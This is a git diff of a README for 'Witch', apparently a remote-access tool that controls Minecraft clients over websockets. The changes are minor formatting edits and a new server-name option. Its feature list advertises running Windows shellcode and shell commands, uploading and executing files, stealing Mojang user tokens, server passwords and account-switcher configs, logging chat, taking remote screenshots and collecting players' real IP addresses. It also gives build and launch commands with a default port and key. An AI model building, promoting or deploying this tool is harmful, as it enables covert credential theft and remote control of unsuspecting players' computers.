@@ -11,35 +11,37 @@ The Witch system controls Minecraft clients using websocket connections.
 
 ## Features
 
+- Custom server name (for client display)
+
 ### System administration
 
-- [X] System information
-- [X] Execute shellcode (for Windows, 32 bit)
-- [X] Shell commands
-- [X] File upload & execute (for Windows)
-- [X] Read text files
-- [X] Get run arguments
+- System information
+- Execute shellcode (for Windows, 32 bit)
+- Shell commands
+- File upload & execute (for Windows)
+- Read text files
+- Get run arguments
 
 ### Social engineering
 
-- [X] [IAS](https://modrinth.com/mod/in-game-account-switcher) mod config steal
-- [X] Grab offline server passwords
-- [X] Grab Mojang user tokens
-- [X] Log chat & commands
+- [IAS](https://modrinth.com/mod/in-game-account-switcher) mod config steal
+- Grab offline server passwords
+- Grab Mojang user tokens
+- Log chat & commands
 
 ### Player information
 
-- [X] Remote screenshot
-- [X] Mod list
-- [X] Player info like coordinates, real ip, etc.
-- [X] Player skin download
+- Remote screenshot
+- Mod list
+- Player info like coordinates, real ip, etc.
+- Player skin download
 
 ### Interaction
 
-- [X] Chat system (in game)
-- [X] Sending chat
-- [X] Filter & mute chat
-- [X] Kick people from server and prevent them from joining server
+- Chat system (in game)
+- Sending chat
+- Filter & mute chat
+- Kick people from server and prevent them from joining server
 
 ### Coding
 
@@ -49,8 +51,8 @@ The Witch system controls Minecraft clients using websocket connections.
 ### Using
 
 * Build client: run `build <server_address>` and you will see `client.jar` in `data` folder.
-* Server: `java -jar server-O.O-all.jar <port> <default_key>`
-* Default port and key: `11451` and `good_key_qwq`
+* Server: `java -jar server-O.O-all.jar <port> <default_key> <name>`
+* Default port, key and name: `11451`, `good_key_qwq` and `Witch`
 
 #### Directories:
 
